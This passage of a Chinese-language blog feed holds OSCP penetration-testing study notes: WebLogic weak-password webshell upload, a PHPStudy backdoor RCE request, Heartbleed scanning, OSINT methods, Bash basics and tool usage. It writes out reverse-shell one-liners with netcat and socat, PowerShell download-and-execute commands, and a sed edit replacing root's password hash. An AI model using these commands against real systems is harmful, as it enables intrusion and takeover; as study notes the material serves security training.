class="headerlink" title="weblogic攻击"></a>weblogic攻击</h3><ul><li>批量扫描WebLogic缺省的WEB管理端口（http为7001，https为7002），开放这两个端口的一般都是安装有WebLogic的主机。 </li><li>Google搜索关键字“WebLogic Server Administration Console inurl:console”，URL后面是console结尾的，一般为目标。 </li><li>在找到的目标URL后面加上console，回车就会自动跳转到管理登录页面</li><li>尝试弱口令登录<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>、用户名密码均为：weblogic <br><span class="hljs-number">2</span>、用户名密码均为：<span class="hljs-keyword">system</span> <br><span class="hljs-number">3</span>、用户名密码均为：portaladmin <br><span class="hljs-number">4</span>、用户名密码均为：guest <br></code></pre></td></tr></table></figure></li><li>登录后找到“mydomain”-&gt;“Deployments”-&gt;“Web Application Modules”-&gt;“Deploy new Web Application Moudule…”</li><li>再点里面的“upload your file(s)”，在跳转后的页面上传war包（war包和Tomcat弱口令利用的包一样，注意马的免杀即可）</li></ul><h3 id="PHPstudy-RCE-漏洞复现"><a href="#PHPstudy-RCE-漏洞复现" class="headerlink" title="PHPstudy RCE 漏洞复现"></a>PHPstudy RCE 漏洞复现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.1.91</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64;rv:<span class="hljs-number">69</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">69</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Acept</span>-Language:zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip,deflate<br><span class="hljs-attribute">Accept</span>-Charset: c3lzdGVtKCd3aG9hbWknKTs=<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="心脏滴血漏洞"><a href="#心脏滴血漏洞" class="headerlink" title="心脏滴血漏洞"></a>心脏滴血漏洞</h3><ul><li>漏洞范围：<ul><li>OpenSSL1.0.1版本</li></ul></li><li>漏洞成因：<ul><li>Heartbleed漏洞是由于未能在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次64KB的速度进行泄露。</li></ul></li><li>漏洞危害：<ul><li>如同漏洞成因所讲，我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户cookie和密码等。</li></ul></li><li>漏洞探测<ul><li><code>nmap -sV -p 8443 --script ssl-heartbleed.nse 192.168.224.131</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727145431.png"></li></ul></li><li>漏洞利用<ul><li>msf直接利用<code>use auxiliary/scanner/ssl/openssl_heartbleed</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220727145532.png"></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web渗透</tag>
      
      <tag>中间件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang入门</title>
    <link href="/2022/07/26/Golang%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/26/Golang%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang入门"><a href="#Golang入门" class="headerlink" title="Golang入门"></a>Golang入门</h1><p>。。。先鸽着</p>]]></content>
    
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>被动信息收集</title>
    <link href="/2022/07/26/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/07/26/%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><ul><li>被动信息收集也称 开源情报 – OSINT</li><li>在不与目标系统交互的情况下, 利用开放信息渠道搜索目标系统信息</li><li>这是个循环而非线形的过程, 下一步如何攻击, 由前一步收集到的信息决定</li><li>信息收集途径、渠道(第三方信息)</li><li>此阶段在渗透测试过程中并非一定必须</li><li>终极目标是了解目标系统, 扩大发展攻击面</li><li>利用漏洞、社工、密码破解..<ul><li>目标系统全无漏洞, 但一个员工在集邮论坛上求购邮票;</li><li>攻击者创建邮票站点, 使其看起来真实, 并在页面中加入客户端攻击代码</li><li>员工访问站点, 被执行攻击代码, 反弹shell</li></ul></li></ul><p><strong>记录一切发现的信息(笔记)</strong></p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li><p>Web侦查(MegaCorp 模拟的纳米科技公司)</p><ul><li>Web站点会泄漏大量信息, 并可能存在长期疏于维护的系统</li><li>发现公司社交媒体账号、员工邮箱、 Twitter账号 <a href="https://www.megacorpone.com/about.html">https://www.megacorpone.com/about.html</a></li><li>关注邮件地址命名规则</li></ul></li><li><p>Whois信息枚举</p><ul><li>基于TCP的服务, 可查询域名、域名服务器、注册者等公开信息</li><li><code>kali@kali:~$ whois megacorpone.com</code></li><li>关注<code>Registrant Name、Admin name、Tech Name、Name Server、电话邮箱、地址</code>等</li><li>与网站联系人信息对比, 发现Tech Name是该公司的网络安全经理</li></ul></li><li><p>反向查询IP地址(地址所有者)</p><ul><li><code>whois 38.100.193.70</code></li></ul></li></ul><h3 id="Google黑客"><a href="#Google黑客" class="headerlink" title="Google黑客"></a>Google黑客</h3><ul><li>发现重要信息、漏洞、配置错误的站点</li><li>从广泛的信息收集开始，通过操作符不断缩小搜索结果范围</li><li><code>site:magacorpone.com filetype:php  # 发现（SIEM）后台</code></li><li><code>ext:jsp ext:cfm ext:pl             # 发现Java、Coldfusion、Perl页面</code></li><li><code>site:megacorpone.com -filetype:admin       # 过滤信息，发现后台入口 </code></li><li><code>intitle:&quot;index of&quot; &quot;parent directior&quot; # 目标列表</code></li><li>Google Hacking Database(GHDB)<ul><li><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li></ul></li></ul><h3 id="开源项目代码库"><a href="#开源项目代码库" class="headerlink" title="开源项目代码库"></a>开源项目代码库</h3><ul><li><code>GitHub、GitLab、SourceForge</code></li><li>发现程序语言、源码、框架、默认账号密码、秘钥、数据库连接设置等</li><li>Github可以搜索用户或组织的库（全局搜索需要账号）</li><li>搜索文件名包含users的所有信息<ul><li><code>filename:users</code></li></ul></li><li>大型库可以使用工具搜索Gitrob、Gitleaks、Recon-NG某些模块（需要token）<ul><li>以上工具通常基于正则和墒检测潜在有价值的信息</li><li>正则匹配特征，常用于搜索密码变体；墒检测用于发现所及字符串（密码）</li><li><code>gitleaks detect -t</code></li></ul></li></ul><h3 id="公开信息平台"><a href="#公开信息平台" class="headerlink" title="公开信息平台"></a>公开信息平台</h3><ul><li>shodan 网路空间搜索引擎, 发现服务器、设备、路由器、ioT等设备资产</li><li>搜索Megacorpone公司SSH服务资产<ul><li><code>hostname:megacorpone.com port:&quot;22&quot;</code></li><li>发现服务、版本、开放端口、主机信息、已知漏洞</li></ul></li><li>贴吧类服务<ul><li>存储和共享内容的网站</li><li><a href="https://pastebin.com/">https://pastebin.com</a></li></ul></li><li>Stack Overflow<ul><li><a href="https://stackoverflow.com/">https://stackoverflow.com</a></li><li>为开发人员提供咨询和回答编码相关问题的网站</li><li>如果发现提问者是目标公司员工, 可以从员工的提问和回答中推断目标公司的情况</li></ul></li></ul><h3 id="安全头扫描器"><a href="#安全头扫描器" class="headerlink" title="安全头扫描器"></a>安全头扫描器</h3><ul><li>代理平台模糊了主动与被动信息收集的边界 <ul><li>Security Headers 分析HTTP响应头</li><li>发现Megacorpone站点缺少众多安全投, 判断管理员并不了解安全加固</li></ul></li><li>常见安全头<ul><li>Content-Security-Policy<ul><li>用来通过指定允许加载哪些资源来防止跨站点脚本攻击(防XSS)</li></ul></li><li>X-Frame-Options<ul><li>响应头，可用于防止您的网站在<code>&lt;frame&gt;，&lt;iframe&gt;或&lt;object&gt;</code>中呈现。(建议SAMEORIGIN)</li></ul></li><li>X-Content-Type-Options<ul><li>确保浏览器始终按照服务器设置的MIME类型来解析(X-Content-Type-Options: nosniff)</li></ul></li><li>Referer-Policy<ul><li>允许站点控制Referer头向外暴露多少信息(所有站点都应该设置它)</li></ul></li><li>Permissions-Policy<ul><li>允许站点控制浏览器可使用哪些特性和api</li></ul></li><li>Cross-Origin Embedder Policy <ul><li>允许网站禁止浏览器加载自残</li></ul></li><li>Cross-Origin Opener Policy<ul><li>允许站点控制起选择性的跨源隔离</li></ul></li><li>Cross-Origin Resource Policy<ul><li>允许资源所有者指定谁可以加载资源</li></ul></li></ul></li></ul><h3 id="SSL测试-x2F-硬件加固"><a href="#SSL测试-x2F-硬件加固" class="headerlink" title="SSL测试 &#x2F; 硬件加固"></a>SSL测试 &#x2F; 硬件加固</h3><ul><li>分析当前服务器的SSl&#x2F;TLS配置<ul><li>与最佳实践对比</li><li>识别SSL&#x2F;TLS相关漏洞(Poodle、Heartbleed)</li><li><a href="https://ssllabs.com/ssltest/">https://ssllabs.com/ssltest/</a></li></ul></li><li>服务器加固&#x2F;硬化思路<ul><li>增强服务器安全配置</li><li>禁用、删除不需要的服务和账号</li><li>修改默认账号密码</li><li>设置适当的安全头</li></ul></li></ul><h2 id="个人信息收集"><a href="#个人信息收集" class="headerlink" title="个人信息收集"></a>个人信息收集</h2><h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><ul><li>搜索企业员工信息<ul><li>用于后续社工、钓鱼、客户端攻击</li><li><strong>收集个人信息可能触犯其他法律</strong></li><li>渗透测试仅针对企业系统, 非个人设备账号</li></ul></li><li>收集Email信息<ul><li>多个公共数据源收集电子邮件信息</li><li><code>kali@kali:~$ theHavester -d megacorpone.com -b google</code></li></ul></li><li>收集泄漏密码<ul><li>搜索泄漏的密码, 结合收集到的邮箱地址, 碰撞密码</li></ul></li></ul><h3 id="社交媒体"><a href="#社交媒体" class="headerlink" title="社交媒体"></a>社交媒体</h3><ul><li>通过社交媒体, 获得公司及其运营相关的信息</li></ul><h3 id="信息收集框架"><a href="#信息收集框架" class="headerlink" title="信息收集框架"></a>信息收集框架</h3><ul><li>OSINT Framework<ul><li><strong><a href="https://osintframework.com/">https://osintframework.com</a></strong></li><li>在一个中心位置包含信息收集工具和网站</li><li>框架中列出的一些工具涵盖了比信息安全更多的学科</li></ul></li><li>Maltego<ul><li>一个非常强大的数据挖掘工具</li><li>搜索了数千个在线数据源</li></ul></li></ul><p><strong>不用追求100%的结果</strong></p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BASH脚本</title>
    <link href="/2022/07/25/BASH%E8%84%9A%E6%9C%AC/"/>
    <url>/2022/07/25/BASH%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h3 id="BASH脚本"><a href="#BASH脚本" class="headerlink" title="BASH脚本"></a>BASH脚本</h3><ul><li>The GNU Bourne-Again Shell(Bash)脚本引擎, 自动化任务和过程</li><li>拓展名为.sh</li><li>起始语句 <code>#!/bin/bash</code></li><li>脚本需要可执行权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x hello-world.sh<br>./hello-world.sh<br></code></pre></td></tr></table></figure></li></ul><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li><p>Bash会逐字解释单引号闭合的每个字符 (双引号闭合的字符, 除$&#96;\外逐字解释)</p></li><li><p>变量的推荐定义方法</p><ul><li>user1&#x3D;$(whoami)</li><li>user1&#x3D;<code>whoami</code></li></ul></li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>$0            -&gt; 脚本文件名自己</li><li>$1-9          -&gt; Bash脚本的前9个参数</li><li>$#            -&gt; 传递给Bash脚本的参数数量</li><li>$@            -&gt; 传递给Bash脚本的所有参数</li><li>$?            -&gt; 最近运行的响应状态</li><li>$USER         -&gt; 运行脚本的用户</li><li>$HOSTNAME     -&gt; 计算机的主机名</li><li>$RANDOM       -&gt; 生成一个随机数</li><li>$LINENO       -&gt; 脚本中的当前行号</li></ul><h3 id="用户输入"><a href="#用户输入" class="headerlink" title="用户输入"></a>用户输入</h3><ul><li><p>命令参数是一种输入, read命令可以实现交互输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello there, would you like to learn how to hack: Y/N?&quot;</span><br><span class="hljs-built_in">read</span> answer<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Your answer was <span class="hljs-variable">$answer</span>&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>隐藏密码输入 -p -s</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># Prompt the user for credentials</span><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&#x27;username: &#x27;</span> username<br><span class="hljs-built_in">read</span> -sp <span class="hljs-string">&#x27;password: &#x27;</span> password<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Thanks, your creds are as follows: &quot;</span> <span class="hljs-variable">$username</span> <span class="hljs-string">&quot; and &quot;</span> <span class="hljs-variable">$password</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>… 先鸽了 之后再学</p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>OSCP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试相关工具</title>
    <link href="/2022/07/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/"/>
    <url>/2022/07/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h3 id="NETCAT-NC"><a href="#NETCAT-NC" class="headerlink" title="NETCAT(NC)"></a>NETCAT(NC)</h3><ul><li>1995年出现, 黑客瑞士军刀, TCP&#x2F;UDP 连接和数据传输工具</li><li>作为客户端连接TCP&#x2F;UDP端口<ul><li>确定端口是否开放</li><li>读取服务Banner信息</li><li>手动连接网络服务, 输入协议指令</li></ul></li></ul><p><strong>作为客户端:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nv 10.11.0.22 110<br><span class="hljs-comment"># -nv 显示详细信息</span><br>USER username   <span class="hljs-comment"># 用户名</span><br>PASS password   <span class="hljs-comment"># 密码</span><br>LIST            <span class="hljs-comment"># 列出所有邮件</span><br>RETR n          <span class="hljs-comment"># 查看指定邮件</span><br>quit            <span class="hljs-comment"># 退出</span><br></code></pre></td></tr></table></figure><p><strong>作为服务端:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 4444<br><span class="hljs-comment"># 侦听4444端口</span><br></code></pre></td></tr></table></figure><ul><li>nc用于传文件<ul><li>服务端侦听<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 4444 &gt; 1.txt<br></code></pre></td></tr></table></figure></li><li>客户端发送<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nv 127.0.0.1 &lt; 2.txt -w 1<br><span class="hljs-comment"># -w 传完后1s后自动断开连接</span><br></code></pre></td></tr></table></figure></li><li>计算md5值<ul><li>md5sum 1.txt</li></ul></li></ul></li></ul><p><strong>nc用于反弹shell</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 服务端开启端口</span><br>nc -nvlp 4444<br><span class="hljs-comment"># 客户端连接并且提交shell</span><br>nc -nv 127.0.0.1 4444 -e /bin/bash<br><span class="hljs-comment"># 部分nc不支持-e, -c参数</span><br><br><span class="hljs-comment"># 这时候使用nc的串联</span><br><span class="hljs-comment"># 服务端开启两个端口 5555, 6666</span><br>nc -nv 127.0.0.0 5555 | /bin/bash | nc 127.0.0.1 6666<br></code></pre></td></tr></table></figure><p><strong>nc扫描端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -znv 10.0.2.5 1-1000<br><span class="hljs-comment"># 扫描1-1000端口是否打开</span><br><span class="hljs-comment"># -C 发送CLRF格式</span><br></code></pre></td></tr></table></figure><h3 id="SOCAT"><a href="#SOCAT" class="headerlink" title="SOCAT"></a>SOCAT</h3><ul><li>建立双向字节流并传输数据</li><li>作为客户端连接服务端口<ul><li><code>socat -TCP4:&lt;server ip&gt;:80</code></li></ul></li><li>作为服务端侦听端口 (侦听1024以下的端口需要sudo权限)<ul><li><code>sudo socat TCP-LISTEN:8080 STDOUT</code></li></ul></li><li>共享文件<ul><li><code>sudo socat TCP-LISTEN:443,fork file:secert.txt</code></li><li>fork -&gt; 创建子进程, 连接断开时 侦听不断</li><li>file -&gt; 指定共享文件</li></ul></li><li>接收文件<ul><li><code>socat TCP4:10.11.0.4:443 file:received.txt,create</code></li></ul></li><li>反弹shell<ul><li><code>socat -d -d TCP4-LISTEN:443 STDOUT</code></li><li>-d -d -&gt; 显示致命、错误、告警和通知等详细信息</li><li><code>socat TCP4:10.0.2.15:443 EXEC/bin/bash</code></li></ul></li><li>正向加密Shell(证书加密, 躲避IDS&#x2F;IPS)<ul><li><code>openssl x509 -req -days 365 -in ca.csr -signkey ca.key -out shell.crt # 生成自签名证书</code></li><li><code>cat shell.key shell.crt &gt; shell.pem # 捆绑证书公私钥</code></li><li><code>sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash # 被控端</code></li><li><code>socat -OPENSSL: # 控制端</code></li></ul></li></ul><h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><ul><li><p>PowerSHell是一个基于任务的命令行shell和脚本语言, 为系统管路员和高级用户而设计</p></li><li><p>目的是自动化管理多系统(Linux, macOS, Unix, Windows)和应用程序</p></li><li><p>PowerShell 5.0</p><ul><li>Windows Server 2016默认安装</li><li>Windows 2021&#x2F;R2 、2018&#x2F;R2</li></ul></li><li><p>PowerShell 4.0</p><ul><li>Windows 8.1&#x2F;Windows 2012 R2 默认已安装</li><li>Win7 sp1、2008 R2 sp1(安装Windows Management Framework 4.0)</li></ul></li><li><p>PowerShell 3.0</p><ul><li>Windows 8&#x2F;Windows Server 2012, 默认已安装</li><li>Win7 sp1、2008 R2 sp1 (安装Windows Management Framework 3.0)</li></ul></li><li><p>内建集成开发环境(ISE)</p></li><li><p>PowerShell 默认执行策略</p><ul><li>默认为restricted, 无法加载配置文件和执行脚本<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ExecutionPolicy</span>                 <span class="hljs-comment"># 查看策略</span><br><span class="hljs-built_in">Set-ExecutionPolicy</span> unrestricted    <span class="hljs-comment"># 设置权限 2016    </span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>使用PowerShell传输文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://kali/binaries/wget.ext&#x27;,&#x27;C:\wget.exe&#x27;)&quot;</span><br><br><span class="hljs-literal">-c</span>                  <span class="hljs-comment"># 执行后续双引号中的命令</span><br><span class="hljs-built_in">new-object</span> cmdlet   <span class="hljs-comment"># 实例化一个.Net框架或COM对象, 本命令是WebClinet类(System.Net)</span><br>DownloadFile        <span class="hljs-comment"># 方法, 后跟源、目的路径作为参数</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h3><ul><li><p>PowerShell版本的NetCat</p><ul><li><a href="https://github.com/besimorhino/powercat/blob/master/powercat.ps1">https://github.com/besimorhino/powercat/blob/master/powercat.ps1</a></li></ul></li><li><p>安装Powercat</p><ul><li><code>sudo apt install powercat</code></li><li><code># 安装完成后位于/usr/share/windows-resources/powercat</code></li></ul></li><li><p>导入powercat所有函数</p><ul><li><code>..\powercat.ps1</code></li><li><code>iex(New-ObjectSystem.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;)</code></li><li><code>iex(New-ObjectSystem.Net.Webclient).DownloadString(&#39;https://10.0.2.15/powercat.ps1&#39;)</code></li></ul></li></ul><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><ul><li><p>使用root账号运行wireshark存在风险</p></li><li><p>抓包能力通过&#x2F;usr&#x2F;share&#x2F;dumpcap实现, 默认只有root和wireshark组成员抓包</p></li><li><p>允许普通用户在所在网卡抓包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo usermoda -aG wireshark <span class="hljs-variable">$USER</span><br></code></pre></td></tr></table></figure></li><li><p>抓包筛选器</p><ul><li>net 10.0.0.0&#x2F;24</li><li>not port 80 and not port 25 and host <a href="http://www.wireshark.org/">www.wireshark.org</a></li><li>tcp port http</li></ul></li><li><p>显示筛选器</p><ul><li>tcp.port &#x3D;&#x3D; 80</li><li>ip.addr &#x3D; 1.1.1.1</li></ul></li><li><p>还原协议流</p></li></ul><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><ul><li><p>普遍用于的基于命令行抓包工具</p></li><li><p>分析读取抓包文件</p><ul><li><code>wget https://https://www.offensive-security.com/pwk-online/password_cracking_filtered.pcap</code></li><li><code>sudo tcpdump -r password_cracking_filtered.pcap</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725160314.png"></li></ul></li><li><p>过滤流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo tcpdump -r password_cracking_filtered.pcap | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">head</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725160700.png"></p></li><li><p>-n    -&gt;    跳过DNS名称查询</p></li><li><p>针对流量最大的IP分别查询其作为源、目的、端口的流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725161118.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725161205.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725161317.png"></p></li><li><p>查询HEX、ASCII格式的内容(发现内容为HTTP流量 + 基本HTTP身份认证请求)</p><ul><li><code>sudo tcpdump -nX -r password_cracking_filtered.pcap</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725161706.png"></li></ul></li><li><p>高级头过滤(只显示传输数据的包 PSH + ACK)</p><ul><li>TCP标志从第14字节开始定义</li></ul></li><li><p>二进制转换十进制</p><ul><li><code>echo &quot;$((2#00011000))&quot;</code></li><li><strong>这地方00011000分别对应TCP报文的标志位, 所以第13字节的值&#x3D;24的时候 就是TCP PSH,ACK&#x3D;&#x3D;1的时候</strong></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo tcpdump -A -n <span class="hljs-string">&#x27;tcp[13]=24&#x27;</span> -r password_cracking_filtered.pcap<br><span class="hljs-comment"># -A 表示ascii形式展示出来</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220725162429.png"></p>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>web渗透</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux常用命令</title>
    <link href="/2022/07/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/07/24/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h3 id="非交互式下修改-etc-passwd"><a href="#非交互式下修改-etc-passwd" class="headerlink" title="非交互式下修改/etc/passwd"></a>非交互式下修改<code>/etc/passwd</code></h3><ul><li>生成linux密码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl passwd -1 123<br></code></pre></td></tr></table></figure><ul><li>提取出以root开头的一行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -E ^root /etc/passwd<br></code></pre></td></tr></table></figure><ul><li>替换密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -E ^root /etc/passwd | sed <span class="hljs-string">&#x27;s/x/$1$cHBOxqcm$4033a1\\/E5hYhfAaknkGg70/&#x27;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="cut命令"><a href="#cut命令" class="headerlink" title="cut命令"></a>cut命令</h3><ul><li>用cut进行分隔</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd ｜ <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;:&quot;</span> -f 1,7 |grep sh| grep -v nologin<br></code></pre></td></tr></table></figure><ul><li>-d 以:进行分隔, 